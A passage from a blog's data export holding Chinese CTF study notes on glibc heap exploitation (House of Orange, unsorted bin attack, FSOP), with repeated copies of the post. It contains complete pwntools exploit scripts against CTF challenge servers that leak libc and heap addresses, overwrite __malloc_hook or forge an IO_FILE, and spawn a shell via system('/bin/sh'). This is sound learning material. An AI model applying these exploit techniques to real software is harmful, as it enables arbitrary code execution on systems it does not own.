class=\"number\">0</span>)*<span class=\"number\">9</span>+p64(<span class=\"number\">0x71</span>))</span><br><span class=\"line\">    edit(<span class=\"number\">1</span>,<span class=\"string\">b&#x27;\\xdd\\x55&#x27;</span>)</span><br><span class=\"line\">    payload=<span class=\"string\">b&#x27;\\0&#x27;</span>*<span class=\"number\">0x33</span>+p64(<span class=\"number\">0xfbad1887</span>)+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+<span class=\"string\">b&#x27;\\0&#x27;</span></span><br><span class=\"line\">    add(<span class=\"number\">0x60</span>,<span class=\"number\">6</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0x60</span>,<span class=\"number\">7</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># leak - libc</span></span><br><span class=\"line\">    io.recv(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">    stdout=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))+<span class=\"number\">0x20</span></span><br><span class=\"line\">    libcbase=stdout-libc.sym[<span class=\"string\">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class=\"line\">    malloc_hook=libcbase+libc.sym[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]</span><br><span class=\"line\">    realloc=libcbase+libc.sym[<span class=\"string\">&#x27;realloc&#x27;</span>]</span><br><span class=\"line\">    one_gadget=[<span class=\"number\">0x4526a</span>,<span class=\"number\">0xf02a4</span>]</span><br><span class=\"line\">    logvalue(<span class=\"string\">&quot;stdout&quot;</span>,<span class=\"built_in\">hex</span>(stdout))</span><br><span class=\"line\">    <span class=\"comment\"># </span></span><br><span class=\"line\">    free(<span class=\"number\">1</span>)</span><br><span class=\"line\">    edit(<span class=\"number\">1</span>,p64(malloc_hook-<span class=\"number\">0x23</span>))</span><br><span class=\"line\">    payload=<span class=\"number\">0xb</span>*<span class=\"string\">b&quot;\\x00&quot;</span>+p64(one_gadget[<span class=\"number\">0</span>]+libcbase)+p64(realloc+<span class=\"number\">4</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0x60</span>,<span class=\"number\">1</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0x60</span>,<span class=\"number\">8</span>,payload)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice &gt;&gt;&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;wlecome input your size of skills: &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0x20</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;input index: &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        io,elf=loadfile(<span class=\"string\">&quot;pwn&quot;</span>,<span class=\"string\">&quot;pwn.challenge.ctf.show&quot;</span>,<span class=\"number\">28175</span>)</span><br><span class=\"line\">        exploit()</span><br><span class=\"line\">        io.interactive()</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        io.close()</span><br></pre></td></tr></table></figure>"},{"title":"House of Orange","cover":"/img/达令.png","_content":"# House of Orange\n## 前言\n看了将近五天的博客，一步一步弄，总算是把步骤都搞清楚了。其实光一个House of  Orang的点不用看怎么久。只是后续unsorted bin attack 和 FSOP 的利用，确实要细看。这道题也无愧是经典。也是渐渐有学习的感觉了。让我们来细细解析这个手法，感受一下pwn的美妙。\n\nps：本文中，没有相关源码的展示和分析，考虑后续去做一个对应的专门的分析板块。\n## house of orange 简介\n使用场景：当程序中没有free功能时，而我们又需要得到free chunk，就可以通过这个手段来获取free chunk\n使用条件：需要要堆溢出漏洞，可以修改top chunk的size\n利用原理：正常情况下（指绕过检查），如果申清的堆块大小大于top chunk大小，那么top chunk就会被放进unsorted bin中。然后重新映射或扩展一个新的top chunk。\n绕过检查：1.top chunk 的size 必须大于MINSIZE ，且小于我们申请的堆块大小。2.top chunk 的pre_inuse 必须为“1”。3.top chunk 的size + top chunk 的addr 必须页对齐(最后3为是0x00)。4.我们申请的堆块必须小于0x2000\n\n## unsorted bin attack & FSOP 简介\n### unsorted bin attack\n使用场景：一般是辅助其他攻击手段的，本身这个手法并没有什么大作用\n使用条件：堆溢出或者uaf，可以编辑unsorted bin 中链尾的 bk\n使用原理：修改unsorted bin链尾bk，可以往bk中写入main_arena+88的地址\n注意事项：在此之后，无法再从unsorted bin中申请堆块\n\n### FSOP \n篡改__IO_list_all 和 _chain，来劫持IO_FILE.然后在FSOP中我们使用_IO_flush_all_lockp来刷新_IO_list_all链表上的所有文件流，也就是对每个流都执行一下fflush，而fflush最终调用了vtable中的_IO_overflow.\n1.在这样的一个利用链里，前面的步骤让我们在__IO_list_all 的表头写入了main_arena+88 。破坏了这个结构体的结构。此时chain字段的内容被修改为main_arena 中 smallbin chunk 的地址。\n2.所以，下一个结构体就会是，我们的small bin 的chunk。此时控制这个chunk 的内容，就能控制__IO_list_all ，按照要求部署结构。再下一次malloc 时，就可以触发。\n3.这里需要注意，__IO_list_all 这个结构是变化的，首先在溢出修改完时，这个的结构是，头在main_arena+88 的位置.此时的chain 指向small bin chunk.所以下一次,表头就是,这个chunk 的头部，里面的字段也会是对应的内容。我们需要控制的flag字段，vtable字段，还有中间的相关字段\n\n## 例题\n### houseoforange_hitcon_2016\n分析一下exp吧，具体的一个流程有时间再补充一下。\n\n![image-20250526224440703](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250526224440703.png)\n1.这一段主要是在泄露libc。先正常添加一个堆块，然后利用溢出去修该top chunk 的size 为0xfa1，紧接着申清大堆块完成house of orange的利用。\n2.然后的add,是为了把libc泄露出来，因为本题没有uaf，所以只能这样。把fd覆盖后，接受bk。\n\n![image-20250526224818280](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250526224818280.png)\n1.这里还是泄露为主，泄露堆地址，这个是题目本身会在申请的堆块里写入地址。同时没有`\"\\x00\"`覆盖，导致后续的泄露。这里把上一个堆块的fd 和 bk 位置都填充满，去泄露下面的信息。\n\n![image-20250526225200971](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250526225200971.png)\n1.这段时unsorted bin attack 和 FSOP 一起的，似乎这个必须一起，不能分开。第五行就是对之前unsorter bin 中chunk bk 的复写。\n2.同时，这个位置也是伪造的small bin。也是后续的第二个FILE 的结构体。\n3.感觉其实应该也不是只能这么写吧，这个应该是所需字节数最少的写法，后续可以尝试把两个分开写写看能不能成功.\n4.现在验证了，这个偏移是不能乱填的，因为必须把原先的堆块的size 覆盖掉，不能随便伪造其他堆块。\n\n\n#### exp\n```python\nfrom esy import *\ncontext.log_level=\"debug\"\narch='amd64'\nip='node5.buuoj.cn'\nport=29775\nio,elf=loadfile(\"houseoforange_hitcon_2016\",ip,port)\nlibc=ELF(\"/home/tsq/glibc-all-in-one/libs/2.23_0ubuntu10_amd64/libc.so.6\")\n\ndef add(size,content):\n\tio.sendlineafter(\"Your choice : \",str(1))\n\tio.sendlineafter(\"Length of name :\",str(size))\n\tio.sendafter(\"Name :\",content)\n\tio.sendlineafter(\"Price of Orange\",str(1))\n\tio.sendlineafter(\"Color of Orange\",str(2))\n\ndef edit(size,content):\n\tio.sendlineafter(\"Your choice : \",str(3))\n\tio.sendlineafter(\"Length of name :\",str(size))\n\tio.sendafter(\"Name:\",content)\n\tio.sendlineafter(\"Price of Orange\",str(1))\n\tio.sendlineafter(\"Color of Orange\",str(2))\n\n\t\ndef show():\n\tio.sendlineafter('Your choice : ',str(2))\n\nadd(0x10,'a')\nedit(0x40,b'b'*0x18+p64(0x21)+p64(0x0000002000000001)+p64(0)*2+p64(0xfa1))\nadd(0x1000,'c'*8)\nadd(0x400,'d'*8)\n#gdb.attach(io)\nshow()\n\nio.recv(0x18)\nleak=u64(io.recv(6).ljust(8,b'\\x00'))\nlibcbase=leak-0x3c5188\n\nio_list_all=libcbase+libc.symbols['_IO_list_all']\nsys_addr=libcbase+libc.symbols['system']\nedit(0x20,'e'*0x10)\n\nshow()\n\nio.recvuntil('e'*0x10)\nleak_heap=u64(io.recv(6).ljust(8,b'\\x00'))\nlogvalue(\"libcbase\",hex(libcbase))\nlogvalue('leak_heap',hex(leak_heap))\npayload=b'f'*0x400\npayload+=p64(0)+p64(0)\npayload+=p64(0)+p64(0)\npayload+=b'/bin/sh\\x00'+p64(0x61) #old top chunk prev_size & size 同时也是fake file的_flags字段\npayload+=p64(0)+p64(io_list_all-0x10) #old top chunk fd & bk\npayload+=p64(0)+p64(1)#_IO_write_base & _IO_write_ptr\npayload+=p64(0)*7\npayload+=p64(leak_heap+0x430)#chain\npayload+=p64(0)*13\npayload+=p64(leak_heap+0x508)\npayload+=p64(0)+p64(0)+p64(sys_addr)\nedit(0x1000,payload)\nio.interactive()\n\n\n```\n## 参考博客\n[关于house of orange(unsorted bin attack &&FSOP)的学习总结 - ZikH26 - 博客园](https://www.cnblogs.com/ZIKH26/articles/16712469.html)\n","source":"_posts/heap/House of Orange.md","raw":"---\ntitle: House of Orange\ntags:\n    - pwn\n    - House of XXX\ncategories:\n    - 学习笔记\ncover: /img/达令.png\n---\n# House of Orange\n## 前言\n看了将近五天的博客，一步一步弄，总算是把步骤都搞清楚了。其实光一个House of  Orang的点不用看怎么久。只是后续unsorted bin attack 和 FSOP 的利用，确实要细看。这道题也无愧是经典。也是渐渐有学习的感觉了。让我们来细细解析这个手法，感受一下pwn的美妙。\n\nps：本文中，没有相关源码的展示和分析，考虑后续去做一个对应的专门的分析板块。\n## house of orange 简介\n使用场景：当程序中没有free功能时，而我们又需要得到free chunk，就可以通过这个手段来获取free chunk\n使用条件：需要要堆溢出漏洞，可以修改top chunk的size\n利用原理：正常情况下（指绕过检查），如果申清的堆块大小大于top chunk大小，那么top chunk就会被放进unsorted bin中。然后重新映射或扩展一个新的top chunk。\n绕过检查：1.top chunk 的size 必须大于MINSIZE ，且小于我们申请的堆块大小。2.top chunk 的pre_inuse 必须为“1”。3.top chunk 的size + top chunk 的addr 必须页对齐(最后3为是0x00)。4.我们申请的堆块必须小于0x2000\n\n## unsorted bin attack & FSOP 简介\n### unsorted bin attack\n使用场景：一般是辅助其他攻击手段的，本身这个手法并没有什么大作用\n使用条件：堆溢出或者uaf，可以编辑unsorted bin 中链尾的 bk\n使用原理：修改unsorted bin链尾bk，可以往bk中写入main_arena+88的地址\n注意事项：在此之后，无法再从unsorted bin中申请堆块\n\n### FSOP \n篡改__IO_list_all 和 _chain，来劫持IO_FILE.然后在FSOP中我们使用_IO_flush_all_lockp来刷新_IO_list_all链表上的所有文件流，也就是对每个流都执行一下fflush，而fflush最终调用了vtable中的_IO_overflow.\n1.在这样的一个利用链里，前面的步骤让我们在__IO_list_all 的表头写入了main_arena+88 。破坏了这个结构体的结构。此时chain字段的内容被修改为main_arena 中 smallbin chunk 的地址。\n2.所以，下一个结构体就会是，我们的small bin 的chunk。此时控制这个chunk 的内容，就能控制__IO_list_all ，按照要求部署结构。再下一次malloc 时，就可以触发。\n3.这里需要注意，__IO_list_all 这个结构是变化的，首先在溢出修改完时，这个的结构是，头在main_arena+88 的位置.此时的chain 指向small bin chunk.所以下一次,表头就是,这个chunk 的头部，里面的字段也会是对应的内容。我们需要控制的flag字段，vtable字段，还有中间的相关字段\n\n## 例题\n### houseoforange_hitcon_2016\n分析一下exp吧，具体的一个流程有时间再补充一下。\n\n![image-20250526224440703](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250526224440703.png)\n1.这一段主要是在泄露libc。先正常添加一个堆块，然后利用溢出去修该top chunk 的size 为0xfa1，紧接着申清大堆块完成house of orange的利用。\n2.然后的add,是为了把libc泄露出来，因为本题没有uaf，所以只能这样。把fd覆盖后，接受bk。\n\n![image-20250526224818280](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250526224818280.png)\n1.这里还是泄露为主，泄露堆地址，这个是题目本身会在申请的堆块里写入地址。同时没有`\"\\x00\"`覆盖，导致后续的泄露。这里把上一个堆块的fd 和 bk 位置都填充满，去泄露下面的信息。\n\n![image-20250526225200971](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250526225200971.png)\n1.这段时unsorted bin attack 和 FSOP 一起的，似乎这个必须一起，不能分开。第五行就是对之前unsorter bin 中chunk bk 的复写。\n2.同时，这个位置也是伪造的small bin。也是后续的第二个FILE 的结构体。\n3.感觉其实应该也不是只能这么写吧，这个应该是所需字节数最少的写法，后续可以尝试把两个分开写写看能不能成功.\n4.现在验证了，这个偏移是不能乱填的，因为必须把原先的堆块的size 覆盖掉，不能随便伪造其他堆块。\n\n\n#### exp\n```python\nfrom esy import *\ncontext.log_level=\"debug\"\narch='amd64'\nip='node5.buuoj.cn'\nport=29775\nio,elf=loadfile(\"houseoforange_hitcon_2016\",ip,port)\nlibc=ELF(\"/home/tsq/glibc-all-in-one/libs/2.23_0ubuntu10_amd64/libc.so.6\")\n\ndef add(size,content):\n\tio.sendlineafter(\"Your choice : \",str(1))\n\tio.sendlineafter(\"Length of name :\",str(size))\n\tio.sendafter(\"Name :\",content)\n\tio.sendlineafter(\"Price of Orange\",str(1))\n\tio.sendlineafter(\"Color of Orange\",str(2))\n\ndef edit(size,content):\n\tio.sendlineafter(\"Your choice : \",str(3))\n\tio.sendlineafter(\"Length of name :\",str(size))\n\tio.sendafter(\"Name:\",content)\n\tio.sendlineafter(\"Price of Orange\",str(1))\n\tio.sendlineafter(\"Color of Orange\",str(2))\n\n\t\ndef show():\n\tio.sendlineafter('Your choice : ',str(2))\n\nadd(0x10,'a')\nedit(0x40,b'b'*0x18+p64(0x21)+p64(0x0000002000000001)+p64(0)*2+p64(0xfa1))\nadd(0x1000,'c'*8)\nadd(0x400,'d'*8)\n#gdb.attach(io)\nshow()\n\nio.recv(0x18)\nleak=u64(io.recv(6).ljust(8,b'\\x00'))\nlibcbase=leak-0x3c5188\n\nio_list_all=libcbase+libc.symbols['_IO_list_all']\nsys_addr=libcbase+libc.symbols['system']\nedit(0x20,'e'*0x10)\n\nshow()\n\nio.recvuntil('e'*0x10)\nleak_heap=u64(io.recv(6).ljust(8,b'\\x00'))\nlogvalue(\"libcbase\",hex(libcbase))\nlogvalue('leak_heap',hex(leak_heap))\npayload=b'f'*0x400\npayload+=p64(0)+p64(0)\npayload+=p64(0)+p64(0)\npayload+=b'/bin/sh\\x00'+p64(0x61) #old top chunk prev_size & size 同时也是fake file的_flags字段\npayload+=p64(0)+p64(io_list_all-0x10) #old top chunk fd & bk\npayload+=p64(0)+p64(1)#_IO_write_base & _IO_write_ptr\npayload+=p64(0)*7\npayload+=p64(leak_heap+0x430)#chain\npayload+=p64(0)*13\npayload+=p64(leak_heap+0x508)\npayload+=p64(0)+p64(0)+p64(sys_addr)\nedit(0x1000,payload)\nio.interactive()\n\n\n```\n## 参考博客\n[关于house of orange(unsorted bin attack &&FSOP)的学习总结 - ZikH26 - 博客园](https://www.cnblogs.com/ZIKH26/articles/16712469.html)\n","slug":"heap/House of Orange","published":1,"date":"2025-06-22T12:08:58.264Z","updated":"2025-06-29T19:44:14.427Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2ie001ruomydy2j9jv2","content":"<h1 id=\"House-of-Orange\"><a href=\"#House-of-Orange\" class=\"headerlink\" title=\"House of Orange\"></a>House of Orange</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>看了将近五天的博客，一步一步弄，总算是把步骤都搞清楚了。其实光一个House of  Orang的点不用看怎么久。只是后续unsorted bin attack 和 FSOP 的利用，确实要细看。这道题也无愧是经典。也是渐渐有学习的感觉了。让我们来细细解析这个手法，感受一下pwn的美妙。</p>\n<p>ps：本文中，没有相关源码的展示和分析，考虑后续去做一个对应的专门的分析板块。</p>\n<h2 id=\"house-of-orange-简介\"><a href=\"#house-of-orange-简介\" class=\"headerlink\" title=\"house of orange 简介\"></a>house of orange 简介</h2><p>使用场景：当程序中没有free功能时，而我们又需要得到free chunk，就可以通过这个手段来获取free chunk<br>使用条件：需要要堆溢出漏洞，可以修改top chunk的size<br>利用原理：正常情况下（指绕过检查），如果申清的堆块大小大于top chunk大小，那么top chunk就会被放进unsorted bin中。然后重新映射或扩展一个新的top chunk。<br>绕过检查：1.top chunk 的size 必须大于MINSIZE ，且小于我们申请的堆块大小。2.top chunk 的pre_inuse 必须为“1”。3.top chunk 的size + top chunk 的addr 必须页对齐(最后3为是0x00)。4.我们申请的堆块必须小于0x2000</p>\n<h2 id=\"unsorted-bin-attack-FSOP-简介\"><a href=\"#unsorted-bin-attack-FSOP-简介\" class=\"headerlink\" title=\"unsorted bin attack &amp; FSOP 简介\"></a>unsorted bin attack &amp; FSOP 简介</h2><h3 id=\"unsorted-bin-attack\"><a href=\"#unsorted-bin-attack\" class=\"headerlink\" title=\"unsorted bin attack\"></a>unsorted bin attack</h3><p>使用场景：一般是辅助其他攻击手段的，本身这个手法并没有什么大作用<br>使用条件：堆溢出或者uaf，可以编辑unsorted bin 中链尾的 bk<br>使用原理：修改unsorted bin链尾bk，可以往bk中写入main_arena+88的地址<br>注意事项：在此之后，无法再从unsorted bin中申请堆块</p>\n<h3 id=\"FSOP\"><a href=\"#FSOP\" class=\"headerlink\" title=\"FSOP\"></a>FSOP</h3><p>篡改__IO_list_all 和 _chain，来劫持IO_FILE.然后在FSOP中我们使用_IO_flush_all_lockp来刷新_IO_list_all链表上的所有文件流，也就是对每个流都执行一下fflush，而fflush最终调用了vtable中的_IO_overflow.<br>1.在这样的一个利用链里，前面的步骤让我们在__IO_list_all 的表头写入了main_arena+88 。破坏了这个结构体的结构。此时chain字段的内容被修改为main_arena 中 smallbin chunk 的地址。<br>2.所以，下一个结构体就会是，我们的small bin 的chunk。此时控制这个chunk 的内容，就能控制__IO_list_all ，按照要求部署结构。再下一次malloc 时，就可以触发。<br>3.这里需要注意，__IO_list_all 这个结构是变化的，首先在溢出修改完时，这个的结构是，头在main_arena+88 的位置.此时的chain 指向small bin chunk.所以下一次,表头就是,这个chunk 的头部，里面的字段也会是对应的内容。我们需要控制的flag字段，vtable字段，还有中间的相关字段</p>\n<h2 id=\"例题\"><a href=\"#例题\" class=\"headerlink\" title=\"例题\"></a>例题</h2><h3 id=\"houseoforange-hitcon-2016\"><a href=\"#houseoforange-hitcon-2016\" class=\"headerlink\" title=\"houseoforange_hitcon_2016\"></a>houseoforange_hitcon_2016</h3><p>分析一下exp吧，具体的一个流程有时间再补充一下。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250526224440703.png\" alt=\"image-20250526224440703\"><br>1.这一段主要是在泄露libc。先正常添加一个堆块，然后利用溢出去修该top chunk 的size 为0xfa1，紧接着申清大堆块完成house of orange的利用。<br>2.然后的add,是为了把libc泄露出来，因为本题没有uaf，所以只能这样。把fd覆盖后，接受bk。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250526224818280.png\" alt=\"image-20250526224818280\"><br>1.这里还是泄露为主，泄露堆地址，这个是题目本身会在申请的堆块里写入地址。同时没有<code>&quot;\\x00&quot;</code>覆盖，导致后续的泄露。这里把上一个堆块的fd 和 bk 位置都填充满，去泄露下面的信息。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250526225200971.png\" alt=\"image-20250526225200971\"><br>1.这段时unsorted bin attack 和 FSOP 一起的，似乎这个必须一起，不能分开。第五行就是对之前unsorter bin 中chunk bk 的复写。<br>2.同时，这个位置也是伪造的small bin。也是后续的第二个FILE 的结构体。<br>3.感觉其实应该也不是只能这么写吧，这个应该是所需字节数最少的写法，后续可以尝试把两个分开写写看能不能成功.<br>4.现在验证了，这个偏移是不能乱填的，因为必须把原先的堆块的size 覆盖掉，不能随便伪造其他堆块。</p>\n<h4 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">arch=<span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">ip=<span class=\"string\">&#x27;node5.buuoj.cn&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">29775</span></span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;houseoforange_hitcon_2016&quot;</span>,ip,port)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;/home/tsq/glibc-all-in-one/libs/2.23_0ubuntu10_amd64/libc.so.6&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;Your choice : &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;Length of name :&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\tio.sendafter(<span class=\"string\">&quot;Name :&quot;</span>,content)</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;Price of Orange&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;Color of Orange&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;Your choice : &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;Length of name :&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\tio.sendafter(<span class=\"string\">&quot;Name:&quot;</span>,content)</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;Price of Orange&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;Color of Orange&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>():</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&#x27;Your choice : &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0x40</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x18</span>+p64(<span class=\"number\">0x21</span>)+p64(<span class=\"number\">0x0000002000000001</span>)+p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span>+p64(<span class=\"number\">0xfa1</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x1000</span>,<span class=\"string\">&#x27;c&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x400</span>,<span class=\"string\">&#x27;d&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">show()</span><br><span class=\"line\"></span><br><span class=\"line\">io.recv(<span class=\"number\">0x18</span>)</span><br><span class=\"line\">leak=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libcbase=leak-<span class=\"number\">0x3c5188</span></span><br><span class=\"line\"></span><br><span class=\"line\">io_list_all=libcbase+libc.symbols[<span class=\"string\">&#x27;_IO_list_all&#x27;</span>]</span><br><span class=\"line\">sys_addr=libcbase+libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">edit(<span class=\"number\">0x20</span>,<span class=\"string\">&#x27;e&#x27;</span>*<span class=\"number\">0x10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">show()</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;e&#x27;</span>*<span class=\"number\">0x10</span>)</span><br><span class=\"line\">leak_heap=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">logvalue(<span class=\"string\">&quot;libcbase&quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">logvalue(<span class=\"string\">&#x27;leak_heap&#x27;</span>,<span class=\"built_in\">hex</span>(leak_heap))</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;f&#x27;</span>*<span class=\"number\">0x400</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload+=<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>+p64(<span class=\"number\">0x61</span>) <span class=\"comment\">#old top chunk prev_size &amp; size 同时也是fake file的_flags字段</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>)+p64(io_list_all-<span class=\"number\">0x10</span>) <span class=\"comment\">#old top chunk fd &amp; bk</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">1</span>)<span class=\"comment\">#_IO_write_base &amp; _IO_write_ptr</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>)*<span class=\"number\">7</span></span><br><span class=\"line\">payload+=p64(leak_heap+<span class=\"number\">0x430</span>)<span class=\"comment\">#chain</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>)*<span class=\"number\">13</span></span><br><span class=\"line\">payload+=p64(leak_heap+<span class=\"number\">0x508</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(sys_addr)</span><br><span class=\"line\">edit(<span class=\"number\">0x1000</span>,payload)</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"参考博客\"><a href=\"#参考博客\" class=\"headerlink\" title=\"参考博客\"></a>参考博客</h2><p><a href=\"https://www.cnblogs.com/ZIKH26/articles/16712469.html\">关于house of orange(unsorted bin attack &amp;&amp;FSOP)的学习总结 - ZikH26 - 博客园</a></p>\n","excerpt":"","more":"<h1 id=\"House-of-Orange\"><a href=\"#House-of-Orange\" class=\"headerlink\" title=\"House of Orange\"></a>House of Orange</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>看了将近五天的博客，一步一步弄，总算是把步骤都搞清楚了。其实光一个House of  Orang的点不用看怎么久。只是后续unsorted bin attack 和 FSOP 的利用，确实要细看。这道题也无愧是经典。也是渐渐有学习的感觉了。让我们来细细解析这个手法，感受一下pwn的美妙。</p>\n<p>ps：本文中，没有相关源码的展示和分析，考虑后续去做一个对应的专门的分析板块。</p>\n<h2 id=\"house-of-orange-简介\"><a href=\"#house-of-orange-简介\" class=\"headerlink\" title=\"house of orange 简介\"></a>house of orange 简介</h2><p>使用场景：当程序中没有free功能时，而我们又需要得到free 